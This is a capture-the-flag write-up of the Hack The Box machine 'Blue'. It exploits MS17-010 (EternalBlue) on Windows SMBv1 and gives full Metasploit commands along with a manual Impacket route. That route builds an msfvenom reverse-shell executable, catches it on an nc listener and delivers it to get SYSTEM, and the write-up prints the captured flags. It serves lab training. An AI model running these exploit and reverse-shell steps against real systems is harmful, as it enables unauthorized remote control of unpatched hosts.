---
title: Blue - Writeup
description: Easy Windows box exploiting MS17-010 (EternalBlue), the SMBv1 RCE behind WannaCry. Rooted via the Metasploit EternalBlue module for a direct SYSTEM shell, with a manual Impacket-based path documented as an alternative.
tags: [windows, ms17-010, eternalblue, smb, metasploit, impacket, msfvenom, system-shell]
layout: writeup
---

# Blue - Writeup

HTB Easy Windows #windows #ms17-010 #eternalblue #smb #metasploit #impacket #system-shell

B

Blue

OS
Windows

Difficulty
Easy

Points
20

Release
28 Jul 2017

IP
10.129.106.78

## Reconnaissance

```fallback
(root㉿kali)# rustscan -a 10.129.106.78 -- -sCV
```

```fallback
Open 10.129.106.78:135
Open 10.129.106.78:139
Open 10.129.106.78:445
Open 10.129.106.78:49152
Open 10.129.106.78:49153
Open 10.129.106.78:49154
Open 10.129.106.78:49155
Open 10.129.106.78:49156
Open 10.129.106.78:49157
```

```fallback
(root㉿kali)# nmap 10.129.106.78 -p445 --script smb-vuln* -T5
```

```fallback
PORT    STATE SERVICE
445/tcp open  microsoft-ds

smb-vuln-ms17-010:
  VULNERABLE:
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    State: VULNERABLE
    IDs:  CVE:CVE-2017-0143
    Risk factor: HIGH
    Disclosure date: 2017-03-14
```

An SMBv1 host vulnerable to MS17-010, the same RCE that WannaCry weaponized.

## Enumeration

```fallback
(root㉿kali)# smbclient -L //10.129.106.78/ -N
```

```fallback
session setup failed: NT_STATUS_INVALID_PARAMETER
```

Anonymous share listing fails outright, no foothold there. With MS17-010 confirmed and no other surface worth chasing, EternalBlue is the direct path to a SYSTEM shell.

## Initial Foothold

The Metasploit EternalBlue module handles the SMBv1 exploitation end to end. Point it at the target, set a local listener, and fire.

```fallback
(root㉿kali)# msfconsole
msf6 > search ms17_010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set LHOST 10.10.14.11
msf6 > set LPORT 4444
msf6 > set RHOST 10.129.106.78
msf6 > exploit
```

MS17-010 corrupts memory in the SMBv1 server itself, the Meterpreter session lands as `NT AUTHORITY\SYSTEM`, so no separate privilege escalation is needed.

## Privilege Escalation

None needed, confirmed directly by reading both flags from their respective desktops.

```fallback
meterpreter > cat ../../haris/Desktop/user.txt
```

```fallback
cc368772f6f7bff3f631b55b04dd0f39
```

```fallback
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
```

```fallback
84e6b7486bee042449eae94bb35b2aee
```

## Alternative: Manual Exploitation (Impacket)

A no-Metasploit path using the public MS17-010 scripts, worth knowing when the module isn't an option.

Set up the environment under Python 2.

```fallback
(root㉿kali)# git clone https://github.com/SecureAuthCorp/impacket.git
(root㉿kali)# cd impacket
(root㉿kali)# virtualenv impacket-venv -p $(which python2)
(root㉿kali)# source impacket-venv/bin/activate
```

Confirm the vulnerability with the checker. If every named pipe returns `STATUS_ACCESS_DENIED`, set `USERNAME = 'guest'` in `checker.py` and re-run.

```fallback
(root㉿kali)# python2 checker.py 10.129.106.78
# named pipes found = vulnerable
```

Build a reverse shell payload and start a listener.

```fallback
(root㉿kali)# msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.4 LPORT=3333 > shell.exe
(root㉿kali)# nc -lvnp 3333
```

Run the exploit, again with `USERNAME = 'guest'` set in the script first.

```fallback
(root㉿kali)# python2 send_and_execute.py 10.129.106.78 shell.exe
```

```fallback
C:\WINDOWS\system32> whoami
nt authority\system
```

## Lessons learned

- A single confirmed kernel-level SMB CVE is often the whole box. When `smb-vuln-ms17-010` comes back VULNERABLE, there's no need to enumerate further surface, the exploit lands directly at SYSTEM.
- Anonymous SMB listing failing (`NT_STATUS_INVALID_PARAMETER`) isn't a dead end on these boxes, it just means the foothold comes from the RCE, not from share access.
- Always keep a manual exploitation path for well-known CVEs. The Impacket MS17-010 scripts need Python 2 and often require switching the pipe auth to `guest`, knowing that avoids being stuck if Metasploit isn't available.
- Confirm the shell's privilege level immediately with `whoami`. On MS17-010 it's SYSTEM from the start, so assuming a separate privesc step would just waste time.
